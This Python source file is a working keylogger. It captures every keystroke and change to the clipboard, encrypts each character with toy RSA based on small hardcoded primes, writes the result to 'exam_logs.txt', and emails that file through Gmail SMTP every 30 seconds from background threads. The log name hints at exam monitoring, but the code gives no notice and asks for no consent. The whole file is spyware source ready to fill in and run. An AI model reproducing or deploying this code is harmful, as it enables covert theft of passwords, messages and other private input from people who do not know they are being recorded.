from pynput.keyboard import Listener
from datetime import datetime
import threading
import time
import clipboard
import math
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

EMAIL_ADDRESS = ""  
EMAIL_PASSWORD = ""   
TO_EMAIL = ""  



log_file = "exam_logs.txt"


p = 491
q = 487
n = p * q
phi_n = (p - 1) * (q - 1)


e = 65537  
while math.gcd(e, phi_n) != 1:
    e += 1


def mod_inverse(a, m):
    m0, x0, x1 = m, 0, 1
    while a > 1:
        q = a // m
        m, a = a % m, m
        x0, x1 = x1 - q * x0, x0
    return x1 + m0 if x1 < 0 else x1

d = mod_inverse(e, phi_n)


def rsa_encrypt(value):
    return pow(value, e, n)


def rsa_decrypt(value):
    return pow(value, d, n)


def send_email():
    while True:
        try:
            if os.path.exists(log_file):
                msg = MIMEMultipart()
                msg['From'] = EMAIL_ADDRESS
                msg['To'] = TO_EMAIL
                msg['Subject'] = "Log File Update"

                
                with open(log_file, "rb") as file:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(file.read())
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename={os.path.basename(log_file)}",
                )
                msg.attach(part)

                
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
                    server.send_message(msg)

            time.sleep(30)  # Wait between emails
        except Exception as e:
            print(f"Failed to send email: {e}")

def log_key(key):
    try:
        key = str(key).replace("'", "")
        t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"{t}:{key}\n"
        ascii_values = [ord(char) for char in log_entry]  # char->ASCII
        encrypted_values = [rsa_encrypt(ascii_val) for ascii_val in ascii_values]  # Encrypt ASCII
        with open(log_file, "a") as file:
            file.write(" ".join(map(str, encrypted_values)) + "\n")  # Write encrypted values
    except Exception as e:
        pass

def monitor_clipboard():
    previous_content = ""
    while True:
        try:
            content = clipboard.paste()
            if content != previous_content:
                t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"[Clipboard]:{t}: {content}\n"
                ascii_values = [ord(char) for char in log_entry]
                encrypted_values = [rsa_encrypt(ascii_val) for ascii_val in ascii_values]
                with open(log_file, "a") as file:
                    file.write(" ".join(map(str, encrypted_values)) + "\n")
                previous_content = content
        except Exception as e:
            pass
        time.sleep(1)

def run_keylogger():
    with Listener(on_press=log_key) as listener:
        listener.join()

def main():
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()

    logger_thread = threading.Thread(target=run_keylogger, daemon=True)
    logger_thread.start()

    email_thread = threading.Thread(target=send_email, daemon=True)
    email_thread.start()

    while True:
        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
